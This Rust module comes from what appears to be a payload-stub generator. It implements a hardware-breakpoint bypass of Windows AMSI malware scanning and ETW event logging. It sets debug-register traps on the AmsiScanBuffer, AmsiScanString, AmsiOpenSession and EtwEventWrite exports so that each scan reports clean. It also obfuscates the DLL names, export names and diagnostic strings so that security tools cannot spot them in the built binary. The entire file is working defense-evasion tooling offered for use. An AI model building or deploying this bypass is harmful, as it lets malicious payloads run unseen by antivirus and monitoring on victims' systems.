//! Hardware-breakpoint AMSI/ETW bypass.
//!
//! Emulates the AMSI scan exports and the ETW event writer with the CPU's debug
//! registers: a hardware breakpoint on each watched export traps into a
//! vectored exception handler that returns clean, so no byte of `amsi.dll` or
//! `ntdll.dll` is ever modified. A Preparation technique: it modifies the
//! process state and never runs the payload. See `README.md` for the full
//! write-up.

use serde::{Deserialize, Serialize};

use crate::engine::obfuscation::StringsConfig;

use super::{Capability, Category, Stability, TechniqueDef};

/// Parameters for the hardware-breakpoint bypass.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct Params {
    /// Watch `AmsiScanBuffer`, the buffer scan every AMSI consumer calls.
    #[serde(default = "default_true")]
    pub amsi: bool,

    /// Also watch `AmsiScanString`, the string-entry scan. Costs a debug
    /// register (only four exist), so it is off by default.
    #[serde(default = "default_false")]
    pub scan_string: bool,

    /// Also watch `AmsiOpenSession`. Costs a debug register, so it is off by
    /// default.
    #[serde(default = "default_false")]
    pub open_session: bool,

    /// Watch `EtwEventWrite`, the user-mode event writer.
    #[serde(default = "default_true")]
    pub etw: bool,
}

/// Default for the load-bearing watch flags: always cover the buffer scan and
/// the event writer.
pub fn default_true() -> bool {
    true
}

/// Default for the optional watch flags: leave the extra debug registers free.
pub fn default_false() -> bool {
    false
}

impl Default for Params {
    /// Defaults to watching `AmsiScanBuffer` and `EtwEventWrite` — two of the
    /// four debug registers (see [`default_true`] / [`default_false`]).
    fn default() -> Self {
        Self {
            amsi: default_true(),
            scan_string: default_false(),
            open_session: default_false(),
            etw: default_true(),
        }
    }
}

/// Static metadata for the hardware-breakpoint bypass.
pub const DEF: TechniqueDef = TechniqueDef {
    name: "hardware_breakpoints",
    // T1562.001: impair the AMSI scan exports. T1562.006: impair ETW. Both
    // targets are emulated through a CPU debug register rather than patched.
    attck: &["T1562.001", "T1562.006"],
    // Measured on Windows 11 26200 (2026-10-14): the trap answers
    // `AmsiScanBuffer` at its entry (a null-context call gets `S_OK` +
    // `AMSI_RESULT_CLEAN` where the real export returns `E_INVALIDARG`). The
    // state stays `Experimental`: that is not a detection-bypass number (the lab
    // host's AMSI provider is inert with real-time protection off) and x86 is
    // future work.
    stability: Stability::Experimental,
    // x64 only: the handler resumes the caller by popping the x64 return
    // address, and the `CONTEXT` debug-register layout it writes is the AMD64
    // one. The x86 form (a `ret N` emulation) is future work.
    requires: &[Capability::WindowsX64],
    // Redundant with the software patches: the two solve the same problem (an
    // execute breakpoint fires before the patched bytes would run). Pick one.
    conflicts: &["patch_amsi", "patch_etw"],
    category: Category::Preparation,
    doc_path: "src/techniques/hardware_breakpoints/README.md",
    readme: include_str!("README.md"),
    stub_fragment: include_str!("stub_fragment.rs"),
    formats: &[],
    requires_indirect_syscalls: false,
    params_example: "technique: hardware_breakpoints\nparams:\n  amsi: true\n  scan_string: false\n  open_session: false\n  etw: true\n",
    // Arming the debug registers goes through the context-thread calls, so
    // `mode: indirect` removes the `GetThreadContext`/`SetThreadContext`
    // imports. Resolution (`LoadLibraryA`/`GetProcAddress`) stays Win32, as in
    // every technique.
    syscalls: &["NtGetContextThread", "NtSetContextThread"],
    resolves_imports: false,
};

/// Runtime diagnostics the fragment can emit, as `(placeholder, plaintext)`
/// pairs.
///
/// `render_fragment` replaces each placeholder with code that rebuilds the
/// message at runtime, so no diagnostic text — and no technique keyword like
/// `loader` — lands in the generated stub's `.rdata`.
const MESSAGES: &[(&str, &str)] = &[
    ("$MSG_LOAD_FAILED$", "failed to load the library to watch"),
    (
        "$MSG_RESOLVE_FAILED$",
        "failed to resolve the function to watch",
    ),
    (
        "$MSG_CONTEXT_READ_FAILED$",
        "failed to read the current thread context",
    ),
    (
        "$MSG_CONTEXT_ARM_FAILED$",
        "failed to arm the debug registers",
    ),
    (
        "$MSG_WATCH_DEPENDENCY$",
        "AmsiScanString and AmsiOpenSession require amsi: true",
    ),
    (
        "$MSG_HANDLER_INSTALL_FAILED$",
        "failed to install the vectored exception handler",
    ),
];

impl Params {
    /// Renders the hardware-breakpoint stub fragment, obfuscating the
    /// `amsi.dll`/`ntdll.dll` and every watched export name through `strings`
    /// so they are rebuilt at runtime, and baking in which exports are watched.
    pub fn render_fragment(&self, strings: &StringsConfig) -> String {
        let amsi_dll = strings
            .obfuscate("amsi.dll")
            .render_stub_expr("hwbp_amsi_dll");
        let amsi_buffer = strings
            .obfuscate("AmsiScanBuffer")
            .render_stub_expr("hwbp_amsi_buffer");
        let amsi_string = strings
            .obfuscate("AmsiScanString")
            .render_stub_expr("hwbp_amsi_string");
        let amsi_session = strings
            .obfuscate("AmsiOpenSession")
            .render_stub_expr("hwbp_amsi_session");
        let ntdll = strings
            .obfuscate("ntdll.dll")
            .render_stub_expr("hwbp_ntdll");
        let etw_write = strings
            .obfuscate("EtwEventWrite")
            .render_stub_expr("hwbp_etw_write");

        // Each error path gets the same treatment as the DLL and function
        // names: the message is rebuilt from obfuscated bytes at runtime, so no
        // diagnostic text reaches `.rdata`.
        let mut rendered = DEF.stub_fragment.to_string();
        for (index, (placeholder, text)) in MESSAGES.iter().enumerate() {
            rendered = rendered.replace(
                placeholder,
                &strings
                    .obfuscate(text)
                    .render_stub_expr(&format!("hwbp_msg_{index}")),
            );
        }

        rendered
            .replace("$AMSI_DLL_DEF$", &amsi_dll)
            .replace("$AMSI_SCAN_BUFFER_DEF$", &amsi_buffer)
            .replace("$AMSI_SCAN_STRING_DEF$", &amsi_string)
            .replace("$AMSI_OPEN_SESSION_DEF$", &amsi_session)
            .replace("$NTDLL_DLL_DEF$", &ntdll)
            .replace("$ETW_WRITE_DEF$", &etw_write)
            .replace("$WATCH_AMSI$", if self.amsi { "true" } else { "false" })
            .replace(
                "$WATCH_SCAN_STRING$",
                if self.scan_string { "true" } else { "false" },
            )
            .replace(
                "$WATCH_OPEN_SESSION$",
                if self.open_session { "true" } else { "false" },
            )
            .replace("$WATCH_ETW$", if self.etw { "true" } else { "false" })
    }
}

#[cfg(test)]
mod tests;
